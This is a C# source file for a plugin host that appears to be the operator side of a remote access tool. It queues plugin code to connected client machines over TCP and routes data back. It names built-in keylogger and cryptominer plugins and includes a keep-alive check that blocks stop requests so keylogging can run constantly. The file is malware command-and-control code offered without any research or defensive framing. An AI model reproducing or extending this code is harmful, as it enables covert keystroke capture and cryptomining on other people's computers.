#nullable disable

using System;
using System.Collections.Concurrent;
using System.Collections.Generic;
using System.Diagnostics;
using System.Linq;
using System.Runtime.Versioning;
using System.Text;
using System.Threading.Tasks;

namespace WpfApp.Plugins
{
    [SupportedOSPlatform("windows")]
    public class PluginHost : IDisposable
    {
        private readonly MainWindow _ui;
        private TcpServer _tcpServer;
        private readonly ConcurrentDictionary<string, IServerPlugin> _loadedPlugins = new();
        private readonly ConcurrentDictionary<string, ConcurrentQueue<PluginCommand>> _commandQueues = new();
        private readonly ConcurrentDictionary<string, PluginSession> _activeSessions = new();

        public IReadOnlyDictionary<string, IServerPlugin> LoadedPlugins =>
            _loadedPlugins.ToDictionary(kvp => kvp.Key, kvp => kvp.Value);

        public PluginHost(MainWindow ui)
        {
            _ui = ui ?? throw new ArgumentNullException(nameof(ui));
        }

        public void SetTcpServer(TcpServer server)
        {
            _tcpServer = server;
            Log($"[INIT] PluginHost.SetTcpServer called, server is {(server != null ? "SET" : "NULL")}");
        }

        // ==================== PLUGIN LOADING ====================

        public async Task<bool> LoadPlugin(IServerPlugin plugin)
        {
            if (plugin == null) throw new ArgumentNullException(nameof(plugin));

            if (_loadedPlugins.ContainsKey(plugin.PluginId))
            {
                Log($"Plugin '{plugin.PluginId}' is already loaded.");
                return false;
            }

            try
            {
                await plugin.Initialize(this);
                _loadedPlugins[plugin.PluginId] = plugin;
                Log($"Plugin loaded: {plugin.DisplayName} v{plugin.Version}");
                return true;
            }
            catch (Exception ex)
            {
                Log($"Failed to load plugin '{plugin.PluginId}': {ex.Message}");
                return false;
            }
        }

        public async Task UnloadPlugin(string pluginId)
        {
            if (_loadedPlugins.TryRemove(pluginId, out var plugin))
            {
                var sessions = _activeSessions
                    .Where(kvp => kvp.Key.EndsWith($":{pluginId}"))
                    .Select(kvp => kvp.Key)
                    .ToList();

                foreach (var sessionKey in sessions)
                {
                    _activeSessions.TryRemove(sessionKey, out _);
                    _commandQueues.TryRemove(sessionKey, out _);
                }

                try
                {
                    await plugin.Shutdown();
                    plugin.Dispose();
                }
                catch (Exception ex)
                {
                    Log($"Error shutting down plugin '{pluginId}': {ex.Message}");
                }

                Log($"Plugin unloaded: {pluginId}");
            }
        }

        // ==================== SESSION MANAGEMENT ====================

        public Task<PluginContext> StartPluginForClient(string clientId, string pluginId)
        {
            if (!_loadedPlugins.TryGetValue(pluginId, out var plugin))
            {
                Log($"Plugin '{pluginId}' not found.");
                return Task.FromResult<PluginContext>(null);
            }

            string sessionKey = $"{clientId}:{pluginId}";

            if (_activeSessions.ContainsKey(sessionKey))
            {
                Log($"Plugin '{pluginId}' already active for client '{clientId}'.");
                return Task.FromResult(_activeSessions[sessionKey].Context);
            }

            var context = new PluginContext(clientId, pluginId, this);
            var session = new PluginSession
            {
                ClientId = clientId,
                PluginId = pluginId,
                Context = context,
                StartedAt = DateTime.UtcNow,
                IsActive = true
            };

            _activeSessions[sessionKey] = session;
            _commandQueues[sessionKey] = new ConcurrentQueue<PluginCommand>();

            string clientCode = plugin.GetClientCode();
            if (!string.IsNullOrEmpty(clientCode))
            {
                byte[] codeBytes = Encoding.UTF8.GetBytes(clientCode);
                byte[] payload = new byte[1 + codeBytes.Length];
                payload[0] = (byte)PluginCommandType.LoadAndStart;
                Buffer.BlockCopy(codeBytes, 0, payload, 1, codeBytes.Length);

                QueueCommandAndSignal(clientId, sessionKey, pluginId, PluginCommandType.LoadAndStart, payload);
                Log($"[PLUGIN] '{pluginId}' queued LoadAndStart for client '{clientId}' ({codeBytes.Length} bytes code)");
            }

            return Task.FromResult(context);
        }

        /// <summary>
        /// Check if a plugin wants to stay alive for a given client (e.g. constant keylog mode).
        /// </summary>
        public bool ShouldPluginKeepAlive(string clientId, string pluginId)
        {
            if (_loadedPlugins.TryGetValue(pluginId, out var plugin))
            {
                if (plugin is Builtin.KeyloggerPlugin kp)
                {
                    return kp.ShouldKeepAlive(clientId);
                }
                if (plugin is Builtin.MinerPlugin mp)
                {
                    return mp.ShouldKeepAlive(clientId);
                }
            }
            return false;
        }

        public async Task StopPluginForClient(string clientId, string pluginId)
        {
            // Check if the plugin wants to stay alive (constant keylog, etc.)
            if (ShouldPluginKeepAlive(clientId, pluginId))
            {
                Log($"[PLUGIN] '{pluginId}' keep-alive active for '{clientId}', suppressing stop.");
                return;
            }

            await ForceStopPluginForClient(clientId, pluginId);
        }

        /// <summary>
        /// Force stop a plugin regardless of keep-alive state.
        /// Used when the client actually disconnects or when explicitly needed.
        /// </summary>
        public async Task ForceStopPluginForClient(string clientId, string pluginId)
        {
            string sessionKey = $"{clientId}:{pluginId}";

            if (_activeSessions.TryRemove(sessionKey, out var session))
            {
                byte[] stopPayload = new byte[] { (byte)PluginCommandType.Stop };

                QueueCommandAndSignal(clientId, sessionKey, pluginId, PluginCommandType.Stop, stopPayload);
                Log($"[PLUGIN] '{pluginId}' queued Stop for client '{clientId}'");

                _ = Task.Run(async () =>
                {
                    await Task.Delay(2000);
                    _commandQueues.TryRemove(sessionKey, out _);
                });

                if (_loadedPlugins.TryGetValue(pluginId, out var plugin))
                {
                    try { await plugin.OnClientDisconnected(clientId); } catch { }
                }

                Log($"Plugin '{pluginId}' stopped for client '{clientId}'.");
            }
        }

        // ==================== DATA ROUTING ====================

        public Task SendPluginDataToClient(string clientId, string pluginId, byte[] data)
        {
            byte[] payload = new byte[1 + data.Length];
            payload[0] = (byte)PluginCommandType.Data;
            Buffer.BlockCopy(data, 0, payload, 1, data.Length);

            string sessionKey = $"{clientId}:{pluginId}";
            QueueCommandAndSignal(clientId, sessionKey, pluginId, PluginCommandType.Data, payload);

            return Task.CompletedTask;
        }

        public async Task OnClientPluginData(string clientId, string pluginId, byte[] data)
        {
            if (_loadedPlugins.TryGetValue(pluginId, out var plugin))
            {
                try
                {
                    var sw = Stopwatch.StartNew();
                    await plugin.OnClientDataReceived(clientId, data);
                    sw.Stop();

                    if (sw.ElapsedMilliseconds > 20)
                        Log($"[PERF] Plugin '{pluginId}' OnClientDataReceived from '{clientId}' took {sw.ElapsedMilliseconds}ms");
                }
                catch (Exception ex)
                {
                    Log($"Plugin '{pluginId}' error processing data from '{clientId}': {ex.Message}");
                }
            }
            else
            {
                Log($"[PLUGIN] Data received for unknown plugin '{pluginId}' from '{clientId}' ({data?.Length ?? 0} bytes)");
            }
        }

        // ==================== COMMAND QUEUE ====================

        private void QueueCommandAndSignal(string clientId, string sessionKey, string pluginId, PluginCommandType type, byte[] payload)
        {
            var queue = _commandQueues.GetOrAdd(sessionKey, _ => new ConcurrentQueue<PluginCommand>());

            queue.Enqueue(new PluginCommand
            {
                Type = type,
                PluginId = pluginId,
                Payload = payload
            });

            int queueDepth = queue.Count;

            if (_tcpServer != null)
            {
                bool isConnected = _tcpServer.IsClientConnected(clientId);
                Log($"[QUEUE] Enqueued {type} for '{pluginId}' -> '{clientId}' ({payload?.Length ?? 0} bytes, depth={queueDepth}, connected={isConnected}) - calling NotifyPendingCommand");
                _tcpServer.NotifyPendingCommand(clientId);
            }
            else
            {
                Log($"[QUEUE] WARNING: _tcpServer is NULL! Cannot signal for '{pluginId}' -> '{clientId}' ({payload?.Length ?? 0} bytes, depth={queueDepth})");
            }
        }

        public int GetPendingCommandCount(string clientId)
        {
            int count = 0;
            string prefix = $"{clientId}:";
            foreach (var kvp in _commandQueues)
            {
                if (kvp.Key.StartsWith(prefix))
                    count += kvp.Value.Count;
            }
            return count;
        }

        public List<PluginCommand> GetPendingCommands(string clientId)
        {
            var commands = new List<PluginCommand>();
            string prefix = $"{clientId}:";
            foreach (var kvp in _commandQueues)
            {
                if (kvp.Key.StartsWith(prefix))
                {
                    while (kvp.Value.TryDequeue(out var cmd))
                        commands.Add(cmd);
                }
            }
            return commands;
        }

        // ==================== SESSION QUERIES ====================

        public bool IsPluginActive(string clientId, string pluginId)
        {
            return _activeSessions.ContainsKey($"{clientId}:{pluginId}");
        }

        public List<string> GetActivePlugins(string clientId)
        {
            string prefix = $"{clientId}:";
            return _activeSessions
                .Where(kvp => kvp.Key.StartsWith(prefix))
                .Select(kvp => kvp.Value.PluginId)
                .ToList();
        }

        public async Task OnClientDisconnected(string clientId)
        {
            string prefix = $"{clientId}:";
            var sessions = _activeSessions
                .Where(kvp => kvp.Key.StartsWith(prefix))
                .ToList();

            foreach (var kvp in sessions)
            {
                // On actual client disconnect, always clean up regardless of keep-alive
                // The client is gone, no point keeping sessions
                _activeSessions.TryRemove(kvp.Key, out _);
                _commandQueues.TryRemove(kvp.Key, out _);

                if (_loadedPlugins.TryGetValue(kvp.Value.PluginId, out var plugin))
                {
                    try { await plugin.OnClientDisconnected(clientId); } catch { }
                }
            }
        }

        // ==================== UTILITY ====================

        public void Log(string message) => _ui.AppendLog(message);

        public void Dispose()
        {
            foreach (var plugin in _loadedPlugins.Values)
            {
                try
                {
                    plugin.Shutdown().Wait(TimeSpan.FromSeconds(5));
                    plugin.Dispose();
                }
                catch { }
            }

            _loadedPlugins.Clear();
            _activeSessions.Clear();
            _commandQueues.Clear();
        }
    }

    // ==================== SUPPORT TYPES ====================

    public class PluginSession
    {
        public string ClientId { get; set; }
        public string PluginId { get; set; }
        public PluginContext Context { get; set; }
        public DateTime StartedAt { get; set; }
        public bool IsActive { get; set; }
    }

    public enum PluginCommandType : byte
    {
        LoadAndStart = 0,
        Data = 1,
        Stop = 2
    }

    public class PluginCommand
    {
        public PluginCommandType Type { get; set; }
        public string PluginId { get; set; }
        public byte[] Payload { get; set; }
    }
}